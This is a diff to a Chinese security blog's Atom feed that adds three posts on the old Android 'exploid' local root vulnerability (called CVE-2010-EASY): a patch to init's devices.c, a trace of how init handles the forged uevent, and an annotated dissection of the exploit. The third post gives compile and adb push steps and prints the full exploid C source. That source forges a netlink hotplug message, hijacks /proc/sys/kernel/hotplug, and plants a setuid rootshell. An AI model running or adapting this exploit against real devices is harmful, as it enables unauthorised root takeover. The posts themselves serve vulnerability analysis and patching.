@@ -4,7 +4,7 @@
   <title><![CDATA[potatoooooo]]></title>
   <link href="http://baozu.us/atom.xml" rel="self"/>
   <link href="http://baozu.us/"/>
-  <updated>2016-04-21T23:57:12+08:00</updated>
+  <updated>2016-04-22T00:10:22+08:00</updated>
   <id>http://baozu.us/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -80,7 +80,7 @@
 
 <p>如下图，Festel分组结构的可逆性不要求加密的核心函数F可逆，故可以自动的生成任意的F函数进而派生出无数对称加密算法。</p>
 
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Feistel_cipher_diagram_en.svg/1022px-Feistel_cipher_diagram_en.svg.png" alt="Feistel"/></p>
+<p><img src="media/14612489355704/14612548258173.png" alt=""/></p>
 
 <p>基于自动化的代码更新及混淆机制从而保障整个Web代码对抗逆向分析和调试的强度，进而将不可信的Web前端打造成可信的客户端。</p>
 
@@ -109,6 +109,390 @@
 <p>目前阿里巴巴提供的滑动验证产品，目前对外提供免费试用，欢迎申请试用<a href="https://www.aliyun.com/product/antifraud">滑动验证</a>，Discuz插件<a href="http://addon.discuz.com/?@oculus.plugin">安装链接</a>。</p>
 
 <p>最后，希望滑动验证产品能够建设更简单和安全的互联网: )</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android提权漏洞CVE-2010-EASY修复]]></title>
+    <link href="http://baozu.us/14612561818311.html"/>
+    <updated>2016-04-22T00:29:41+08:00</updated>
+    <id>http://baozu.us/14612561818311.html</id>
+    <content type="html"><![CDATA[
+<p>CVE-2010-EASY漏洞是Android两大提权漏洞之一，它的修复方法很简单。只需要给system/core/init/devices.c文件打个补丁。</p>
+
+<p>具体内容及注释如下:</p>
+
+<pre><code>   static int open_uevent_socket(void)                                                            
+{ 
++    setsockopt(s, SOL_SOCKET, SO_PASSCRED, &amp;on, sizeof(on));
+//在open_uevent_socket对套接字增加一个选项 SO_PASSCRED，这样可以让套接字增加一个认证，让接收者可以知道发送者的uid和gid :-)
+ 
+}
+ 
+void handle_device_fd(int fd)
+{
++    for(;;) {
++        char msg[UEVENT_MSG_LEN+2];
++        char cred_msg[CMSG_SPACE(sizeof(struct ucred))];
++        struct iovec iov = {msg, sizeof(msg)};
++        struct sockaddr_nl snl;
++        struct msghdr hdr = {&amp;snl, sizeof(snl), &amp;iov, 1, cred_msg, sizeof(cred_msg), 0};
++
++        ssize_t n = recvmsg(fd, &amp;hdr, 0);
++        if (n &lt;= 0) {
++            break;
++        }
+ 
+-    while((n = recv(fd, msg, UEVENT_MSG_LEN, 0)) &gt; 0) {
+-        struct uevent uevent;
++        if ((snl.nl_groups != 1) || (snl.nl_pid != 0)) {
++            /* 如果不是内核的多播信息则抛弃 */
++            continue;
++        }
++
++        struct cmsghdr * cmsg = CMSG_FIRSTHDR(&amp;hdr);
++        if (cmsg == NULL || cmsg-&gt;cmsg_type != SCM_CREDENTIALS) {
++            /* 如果发送者的认证没有则抛弃 */
++            continue;
++        }
++
++        struct ucred * cred = (struct ucred *)CMSG_DATA(cmsg);
++        if (cred-&gt;uid != 0) {
++            /* 消息不是来自于root用户则抛弃 */
++            continue;
++        }
+}
+}
+</code></pre>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[结合init源码剖析Android root提权漏洞（CVE-2010-EASY）]]></title>
+    <link href="http://baozu.us/14612558333136.html"/>
+    <updated>2016-04-22T00:23:53+08:00</updated>
+    <id>http://baozu.us/14612558333136.html</id>
+    <content type="html"><![CDATA[
+<p>这篇文章是上一篇博客的后续分析，主要介绍向init进程发送热拔插信息后init进程的处理流程。</p>
+
+<p>首先我们来了解一个数据结构，uevent，如下:</p>
+
+<pre><code>struct uevent {                                                                                
+    const char *action;                                                                        
+    const char *path;                                                                          
+    const char *subsystem;                                                                     
+    const char *firmware;                                                                      
+    int major;                                                                                 
+    int minor;                                                                                 
+};  
+</code></pre>
+
+<p> <br/>
+内核收到的信息如下:</p>
+
+<pre><code>ACTION=add
+DEVPATH=/../data/local/tmp
+SUBSYSTEM=firmware
+FIRMWARE=../../../data/local/tmp/hotplug
+</code></pre>
+
+<p> 通过如下函数parse_event进行解析:</p>
+
+<pre><code>static void parse_event(const char *msg, struct uevent *uevent) 
+{
+ 
+    while(*msg) {                                                                              
+        if(!strncmp(msg, &quot;ACTION=&quot;, 7)) {                                                      
+            msg += 7;                                                                          
+            uevent-&gt;action = msg;                                                              
+        } else if(!strncmp(msg, &quot;DEVPATH=&quot;, 8)) {                                              
+            msg += 8;                                                                          
+            uevent-&gt;path = msg;                                                                
+        } else if(!strncmp(msg, &quot;SUBSYSTEM=&quot;, 10)) {                                           
+            msg += 10;                                                                         
+            uevent-&gt;subsystem = msg;                                                           
+        } else if(!strncmp(msg, &quot;FIRMWARE=&quot;, 9)) {                                             
+            msg += 9;                                                                          
+            uevent-&gt;firmware = msg;                                                            
+        } else if(!strncmp(msg, &quot;MAJOR=&quot;, 6)) {                                                
+            msg += 6;                                                                          
+            uevent-&gt;major = atoi(msg);                                                         
+        } else if(!strncmp(msg, &quot;MINOR=&quot;, 6)) {                                                
+            msg += 6;                                                                          
+            uevent-&gt;minor = atoi(msg);                                                         
+        }
+         while(*msg++)；
+    }           
+}
+</code></pre>
+
+<p>经过解析之后，uevent的结构为:</p>
+
+<pre><code>Action=&quot;add&quot;
+path=&quot;/../data/local/tmp&quot;
+subsystem=&quot;firmware&quot;
+firmware=&quot;../../../data/local/tmp/hotplug&quot;
+</code></pre>
+
+<p> <br/>
+之后来到处理firmware的核心函数:</p>
+
+<pre><code>static void process_firmware_event(struct uevent *uevent)
+{
+    l = asprintf(&amp;root, SYSFS_PREFIX&quot;%s/&quot;, uevent-&gt;path);
+    //root为/sys/../data/local/tmp/=/data/local/tmp/
+    
+    l = asprintf(&amp;loading, &quot;%sloading&quot;, root);
+    //loading为/data/local/tmp/loading
+    
+    l = asprintf(&amp;data, &quot;%sdata&quot;, root);
+    //data为/data/local/tmp/data   其内容为指向/proc/sys/kernel/hotplug的符号链接
+    
+    l = asprintf(&amp;file, FIRMWARE_DIR&quot;/%s&quot;, uevent-&gt;firmware);
+    //file为/etc/firmware/../../../data/local/tmp/hotplug=/data/local/tmp/hotplug
+    
+    loading_fd = open(loading, O_WRONLY);
+    
+    data_fd = open(data, O_WRONLY); 
+    
+    fw_fd = open(file, O_RDONLY);
+    
+    load_firmware(fw_fd, loading_fd, data_fd)；
+}
+ 
+最后来到load_firmware函数,把hotplug中的数据写到/proc/sys/kernel/hotplug中 其内容变为/data/local/tmp/exploid
+
+static int load_firmware(int fw_fd, int loading_fd, int data_fd)
+{
+    while (len_to_copy &gt; 0) {
+        char buf[PAGE_SIZE];
+ 
+ 
+        nr = read(fw_fd, buf, sizeof(buf));
+                                                                         
+        len_to_copy -= nr;                                                                     
+        while (nr &gt; 0) {                                                                       
+                                                                                               
+            nw = write(data_fd, buf + nw, nr);                                                 
+ 
+            nr -= nw;
+        }
+    }
+}
+</code></pre>
+
+<p> <br/>
+最后/proc/sys/kernel/hotplug中写入了我们的恶意程序，只要再次受到如wifi打开、usb插入等热拔插信息，内核就会以root权限加载我们的程序再一次执行，从而达到提权的目的。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android root源代码剖析(基于CVE-2010-EASY)]]></title>
+    <link href="http://baozu.us/14612554261853.html"/>
+    <updated>2016-04-22T00:17:06+08:00</updated>
+    <id>http://baozu.us/14612554261853.html</id>
+    <content type="html"><![CDATA[
+<p>linux系统由udev提供系统设备的管理，如提供热拔插usb设备等等。而Android把udev的工作移交给init进程。而linux中版本号小于1.4.1的udev不会检查是由内核还是用户发送热拔插信息。因此用户可以发送恶意的信息让内核加载定义的恶意程序从而取得root权限。</p>
+
+<ul>
+<li>通过在 <a href="http://www.codesourcery.com/sgpp/lite/arm/portal/release1803">http://www.codesourcery.com/sgpp/lite/arm/portal/release1803</a> 下载编译工具</li>
+<li>通过arm-none-eabi-gcc exploid.c -static -o exploid 编译</li>
+<li>adb push exploid /data/local/tmp 目录中执行即可root</li>
+</ul>
+
+<p>提权之后rootshell是一个权限为04711的属于root的可执行程序，普通用户也可以运行该程序，由于S位置位，当普通用户执行该程序时有效用户ID为root，从而可以运行root用户才能执行的程序和操作，从而提权成功。<br/>
+ <br/>
+源码剖析如下(程序执行的顺序已注释)：</p>
+
+<pre><code>
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;linux/netlink.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/mount.h&gt;
+ 
+int main(int argc, char **argv, char **env)
+{
+        char buf[512], path[512];
+        int ofd;
+        struct sockaddr_nl snl;
+        struct iovec iov = {buf, sizeof(buf)};
+        //(1)初始化要发送的数据，通过NET_LINK机制（参见man 手册，可以与内核实现近似于套接字的通信方式）发送
+        struct msghdr msg = {&amp;snl, sizeof(snl), &amp;iov, 1, NULL, 0, 0};
+        int sock;
+        char *basedir = NULL;
+ 
+ 
+        /* I hope there is no LD_ bug in androids rtld :) */
+        //(11)root后执行rootshell则执行该步，直接创建一个有root权限的shell
+        if (geteuid() == 0 &amp;&amp; getuid() != 0)
+                rootshell(env);
+ 
+    //(2)获取程序的路径，为/data/local/tmp/exploid
+        if (readlink(&quot;/proc/self/exe&quot;, path, sizeof(path)) &lt; 0)
+                die(&quot;[-] readlink&quot;);
+ 
+        if (geteuid() == 0) {
+        //(9)有内核加载热拔插固件时再次执行该应用，此时有效id为为0，有root权限
+                clear_hotplug();
+                /* remount /system rw */
+                
+                //(10)拷贝自己到/system/bin/目录下成为rootshell，并改变sh的文件属性
+                remount_system(&quot;/system&quot;);
+                if (copy(path, &quot;/system/bin/rootshell&quot;) != 0)
+                        chmod(&quot;/system/bin/sh&quot;, 04755);
+                else
+                        chmod(&quot;/system/bin/rootshell&quot;, 04711);
+                for (;;)
+                        sleep(3);
+        }
+ 
+        printf(&quot;[*] Android local root exploid (C) The Android Exploid Crew\n&quot;);
+    //(3)改变工作目录，没有root权限，只可以在少数目录执行
+        basedir = &quot;/sqlite_stmt_journals&quot;;
+        if (chdir(basedir) &lt; 0) {
+                basedir = &quot;/data/local/tmp&quot;;
+                if (chdir(basedir) &lt; 0)
+                        basedir = strdup(getcwd(buf, sizeof(buf)));
+        }
+        printf(&quot;[+] Using basedir=%s, path=%s\n&quot;, basedir, path);
+        printf(&quot;[+] opening NETLINK_KOBJECT_UEVENT socket\n&quot;);
+ 
+        memset(&amp;snl, 0, sizeof(snl));
+        snl.nl_pid = 1;
+        snl.nl_family = AF_NETLINK;
+        
+    //(4)构建一个NETLINK的套接字
+        if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) &lt; 0)
+                die(&quot;[-] socket&quot;);
+ 
+    //(5)创建要热拔插的文件，其中hotplug文件中存储的为/data/local/tmp/exploid
+        close(creat(&quot;loading&quot;, 0666));
+        if ((ofd = creat(&quot;hotplug&quot;, 0644)) &lt; 0)
+                die(&quot;[-] creat&quot;);
+        if (write(ofd, path , strlen(path)) &lt; 0)
+                die(&quot;[-] write&quot;);
+        close(ofd);
+        
+        //(6)建立一个data文件，为指向系统的hotplug的符号链接
+        symlink(&quot;/proc/sys/kernel/hotplug&quot;, &quot;data&quot;);
+        
+        //(7)构建发送给内核的信息，内容为进行热拔插，固件位置在/data/local/tmp/hotplug
+        snprintf(buf, sizeof(buf), &quot;ACTION=add%cDEVPATH=/..%s%c&quot;
+                 &quot;SUBSYSTEM=firmware%c&quot;
+                 &quot;FIRMWARE=../../..%s/hotplug%c&quot;, 0, basedir, 0, 0, basedir, 0);
+        printf(&quot;[+] sending add message ...\n&quot;);
+        
+        //(8)发送该信息
+        if (sendmsg(sock, &amp;msg, 0) &lt; 0)
+                die(&quot;[-] sendmsg&quot;);
+        close(sock);
+        printf(&quot;[*] Try to invoke hotplug now, clicking at the wireless\n&quot;
+               &quot;[*] settings, plugin USB key etc.\n&quot;
+               &quot;[*] You succeeded if you find /system/bin/rootshell.\n&quot;
+               &quot;[*] GUI might hang/restart meanwhile so be patient.\n&quot;);
+        sleep(3);
+        return 0;
+}
+ 
+void die(const char *msg)
+{
+        perror(msg);
+        exit(errno);
+}
+ 
+ 
+int copy(const char *from, const char *to)
+{
+        int fd1, fd2;
+        char buf[0x1000];
+        int r = 0;
+ 
+        if ((fd1 = open(from, O_RDONLY)) &lt; 0)
+                return -1;
+        if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) &lt; 0) {
+                close(fd1);
+                return -1;
+        }
+ 
+        for (;;) {
+                r = read(fd1, buf, sizeof(buf));
+                if (r &lt;= 0)
+                        break;
+                if (write(fd2, buf, r) != r)
+                        break;
+        }
+ 
+        close(fd1);
+        close(fd2);
+        sync(); sync();
+        return r;
+}
+ 
+ 
+void clear_hotplug()
+{
+        int ofd = open(&quot;/proc/sys/kernel/hotplug&quot;, O_WRONLY|O_TRUNC);
+        write(ofd, &quot;&quot;, 1);
+        close(ofd);
+}
+ 
+ 
+void rootshell(char **env)
+{
+        char *sh[] = {&quot;/system/bin/sh&quot;, 0};
+ 
+        // AID_SHELL
+        if (getuid() != 2000)
+                die(&quot;[-] Permission denied.&quot;);
+ 
+        setuid(0); setgid(0);
+        execve(*sh, sh, env);
+        die(&quot;[-] execve&quot;);
+}
+ 
+ 
+int remount_system(const char *mntpoint)
+{
+        FILE *f = NULL;
+        int found = 0;
+        char buf[1024], *dev = NULL, *fstype = NULL;
+ 
+        if ((f = fopen(&quot;/proc/mounts&quot;, &quot;r&quot;)) == NULL)
+                return -1;
+ 
+        memset(buf, 0, sizeof(buf));
+        for (;!feof(f);) {
+                if (fgets(buf, sizeof(buf), f) == NULL)
+                        break;
+                if (strstr(buf, mntpoint)) {
+                        found = 1;
+                        break;
+                }
+        }
+        fclose(f);
+        if (!found)
+                return -1;
+        if ((dev = strtok(buf, &quot; \t&quot;)) == NULL)
+                return -1;
+        if (strtok(NULL, &quot; \t&quot;) == NULL)
+                return -1;
+        if ((fstype = strtok(NULL, &quot; \t&quot;)) == NULL)
+                return -1;
+        return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
+}
+
+</code></pre>
 
 ]]></content>
   </entry>
